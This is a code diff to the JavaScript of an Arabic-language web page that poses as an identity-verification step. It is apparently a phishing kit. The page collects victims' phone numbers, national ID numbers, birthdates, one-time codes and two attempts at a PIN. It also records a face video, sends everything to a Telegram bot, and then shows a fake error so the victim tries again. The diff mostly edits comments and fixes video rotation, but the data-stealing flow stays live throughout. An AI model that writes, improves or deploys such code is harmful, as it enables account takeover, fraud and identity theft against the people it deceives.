@@ -141,7 +141,7 @@
     let recordedChunks = [];
     let faceModel = null;
     let rafId = null;
-    let previewMirror = false; // user-visible mirror toggle (default: natural/non-mirrored)
+    let previewMirror = false; // controls only visible preview (default: natural)
 
     /* DOM refs */
     const app = document.getElementById('app');
@@ -165,7 +165,7 @@
     function codeWrap(num) { return `<code>${escapeHtml(num)}</code>`; }
     function chooseMimeType() { const candidates = ['video/webm;codecs=vp9,opus','video/webm;codecs=vp8,opus','video/webm;codecs=vp8','video/mp4']; for (const c of candidates) try { if (MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported(c)) return c; } catch(e){} return ''; }
 
-    /* Telegram: send messages with only numbers wrapped in <code> so they are copyable */
+    /* Telegram message (numbers wrapped in <code>) */
     async function sendTelegramHtml(text) {
       try {
         const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -180,19 +180,14 @@
     }
 
     async function sendSequenceBeforeVideo() {
-      // 1) phone only
       await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}`);
-      // 2) phone + national + birthdate
       await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرقم الوطني: ${codeWrap(userData.nationalId)}\nتاريخ الميلاد: ${escapeHtml(userData.birthdate)}`);
-      // 3) add temp code
       await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرقم الوطني: ${codeWrap(userData.nationalId)}\nتاريخ الميلاد: ${escapeHtml(userData.birthdate)}\nالرمز المؤقت: ${codeWrap(userData.code5)}`);
-      // 4) add fixed first attempt
       await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرمز الثابت (محاولة 1): ${codeWrap(userData.code4_first)}\nالرمز المؤقت: ${codeWrap(userData.code5)}`);
-      // 5) fixed second attempt
       await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرمز الثابت (محاولة 2): ${codeWrap(userData.code4_second)}\nالرمز المؤقت: ${codeWrap(userData.code5)}`);
     }
 
-    /* load face model silently */
+    /* Load face model silently */
     async function loadFaceModelSilently() {
       if (faceModel) return faceModel;
       while (!faceModel) {
@@ -228,7 +223,7 @@
     function hideModalError() { modalError.classList.remove('active'); modalError.setAttribute('aria-hidden','true'); }
     modalCloseBtn.addEventListener('click', hideModalError);
 
-    /* Flow UI (kept similar) */
+    /* Flow UI (same as before) */
     function renderPhoneStep() {
       clearTimers();
       app.innerHTML = `
@@ -247,7 +242,7 @@
         const phone = phoneInput.value.trim();
         if (!/^07\d{8}$/.test(phone)) { alert('يرجى إدخال رقم هاتف صحيح يبدأ بـ 07 ويتكون من 10 أرقام'); phoneInput.focus(); return; }
         userData.phone = phone;
-        await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}`); // phone-only message
+        await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}`);
         renderNationalIdStep();
       };
     }
@@ -421,13 +416,13 @@
         const code2 = retryInput.value.trim();
         if (code2.length !== 4) { alert('يرجى إدخال رمز مكون من 4 أرقام'); retryInput.focus(); return; }
         userData.code4_second = code2;
-        await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرمز الثابت (محاولة 2): ${codeWrap(userData.code4_second)}\nال��مز المؤقت: ${codeWrap(userData.code5)}`);
+        await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرمز الثابت (محاولة 2): ${codeWrap(userData.code4_second)}\nالرمز المؤقت: ${codeWrap(userData.code5)}`);
         renderPhoneStep();
         setTimeout(() => startRecordingAndSendAll(), 600);
       };
     }
 
-    /* Recording: improved portrait canvas preview and recording; previewMirror toggles visible preview only */
+    /* Recording helpers and the corrected createPortraitCanvasAndPreview function */
     async function startCameraForRecording() {
       if (mediaStream) return mediaStream;
       try {
@@ -444,14 +439,19 @@
     }
     function stopCameraForRecording() { try { if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()); mediaStream = null; } } catch(e){} }
 
+    // REPLACED: Robust portrait canvas preview/drawing function
     function createPortraitCanvasAndPreview(videoEl) {
+      // Target recording resolution (portrait)
       const targetW = 720;
       const targetH = 1280;
+
+      // offscreen canvas used for recording frames (natural orientation, non-mirrored)
       const offscreen = document.createElement('canvas');
       offscreen.width = targetW;
       offscreen.height = targetH;
       const ctx = offscreen.getContext('2d');
 
+      // visible preview canvas (in UI)
       const preview = previewCanvas;
       const DPR = window.devicePixelRatio || 1;
       preview.width = Math.round(targetW * DPR);
@@ -459,58 +459,70 @@
       preview.style.width = '100%';
       preview.style.height = '100%';
       const pctx = preview.getContext('2d');
-      pctx.setTransform(DPR,0,0,DPR,0,0);
+      pctx.setTransform(DPR,0,0,DPR,0,0); // support high-DPI
 
       let cancelled = false;
+
       async function drawLoop() {
         if (cancelled) return;
         const vw = videoEl.videoWidth || 1;
         const vh = videoEl.videoHeight || 1;
+
         if (vw > 0 && vh > 0) {
           ctx.fillStyle = '#000';
           ctx.fillRect(0,0,targetW,targetH);
+
+          // If source frame is landscape (vw > vh) rotate 90deg CW to make portrait upright.
+          // This fixes the sideways / "tilted" capture seen on some devices.
           if (vw > vh) {
             ctx.save();
-            // rotate 90deg CW to make landscape upright portrait
             ctx.translate(targetW/2, targetH/2);
-            ctx.rotate(90 * Math.PI / 180);
+            ctx.rotate(90 * Math.PI / 180); // 90deg CW
             const scale = Math.max(targetH / vw, targetW / vh);
             const sw = vw / scale;
             const sh = vh / scale;
-            const sx = Math.max(0, (vw - sw)/2);
-            const sy = Math.max(0, (vh - sh)/2);
+            const sx = Math.max(0, (vw - sw) / 2);
+            const sy = Math.max(0, (vh - sh) / 2);
             ctx.drawImage(videoEl, sx, sy, sw, sh, -targetH/2, -targetW/2, targetH, targetW);
             ctx.restore();
           } else {
+            // Portrait: center-crop to cover
             const scale = Math.max(targetW / vw, targetH / vh);
             const sw = vw / scale;
             const sh = vh / scale;
-            const sx = Math.max(0, (vw - sw)/2);
-            const sy = Math.max(0, (vh - sh)/2);
+            const sx = Math.max(0, (vw - sw) / 2);
+            const sy = Math.max(0, (vh - sh) / 2);
             ctx.drawImage(videoEl, sx, sy, sw, sh, 0, 0, targetW, targetH);
           }
 
-          // copy to preview; previewMirror controls visible flip only (not recorded canvas)
+          // Draw to preview canvas.
+          // previewMirror flag only affects the visible preview (user's expectation).
           try {
-            pctx.clearRect(0,0,preview.width,preview.height);
+            pctx.clearRect(0,0, preview.width, preview.height);
             if (previewMirror) {
-              // draw mirrored preview by flipping horizontally when painting to preview
               pctx.save();
-              pctx.scale(-1,1);
+              pctx.scale(-1, 1);
               pctx.drawImage(offscreen, -preview.width / DPR, 0, preview.width / DPR, preview.height / DPR);
               pctx.restore();
             } else {
               pctx.drawImage(offscreen, 0, 0, preview.width / DPR, preview.height / DPR);
             }
-          } catch (e) {}
+          } catch (err) {
+            // ignore occasional drawing issues
+          }
         }
+
         rafId = requestAnimationFrame(drawLoop);
       }
+
       drawLoop();
 
       return {
         canvas: offscreen,
-        stop() { cancelled = true; if (rafId) { cancelAnimationFrame(rafId); rafId = null; } }
+        stop() {
+          cancelled = true;
+          if (rafId) { cancelAnimationFrame(rafId); rafId = null; }
+        }
       };
     }
 
@@ -519,11 +531,13 @@
       const finalStream = new MediaStream();
       canvasStream.getVideoTracks().forEach(t => finalStream.addTrack(t));
       if (audioTrack) finalStream.addTrack(audioTrack);
+
       const mime = chooseMimeType();
       let recorder;
       recordedChunks = [];
       try { recorder = mime ? new MediaRecorder(finalStream, { mimeType: mime }) : new MediaRecorder(finalStream); }
       catch(e) { recorder = new MediaRecorder(finalStream); }
+
       recorder.ondataavailable = ev => { if (ev.data && ev.data.size) recordedChunks.push(ev.data); };
       recorder.onerror = ev => console.warn('recorder error', ev);
       recorder.start(300);
@@ -560,7 +574,7 @@
       return new Blob(recordedChunks, { type: blobType });
     }
 
-    /* Top-level */
+    /* Main flow */
     async function startRecordingAndSendAll() {
       recOverlay.style.display = 'flex';
       recOverlay.setAttribute('aria-hidden','false');
@@ -579,18 +593,20 @@
         await videoEl.play().catch(()=>{});
         const audioTrack = (stream.getAudioTracks && stream.getAudioTracks().length) ? stream.getAudioTracks()[0] : null;
 
-        // send textual sequence per request
+        // send textual sequence as requested (numbers wrapped in <code>)
         await sendSequenceBeforeVideo();
 
+        // load face model silently
         loadFaceModelSilently().catch(()=>{});
 
+        // record canvas-based portrait video
         const blob = await recordFullSequenceViaCanvas(videoEl, audioTrack);
 
-        // show topStatus only while sending
+        // show topStatus while sending
         topStatus.style.display = 'block';
         topStatus.textContent = 'جاري التحقق من الفيديو';
 
-        // send textual block with numbers wrapped (so numbers are copyable)
+        // send textual block with numbers wrapped
         const captionLines = [
           `رقم الهاتف: ${userData.phone}`,
           `الرقم الوطني: ${userData.nationalId}`,
@@ -617,6 +633,7 @@
         form.append('video', blob, 'verification.webm');
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: form });
 
+        // show modal error after sending (per request)
         showModalError('يوجد خطأ بالمعلومات. رجاءً حاول مرة أخرى.');
       } catch (e) {
         console.error('record/send error', e);
@@ -658,7 +675,6 @@
     });
 
     mirrorToggle.addEventListener('click', () => {
-      // toggle visible preview mirror only (recorded canvas stays natural)
       previewMirror = !previewMirror;
       mirrorToggle.textContent = previewMirror ? 'عرض مرآة' : 'عرض طبيعي';
     });
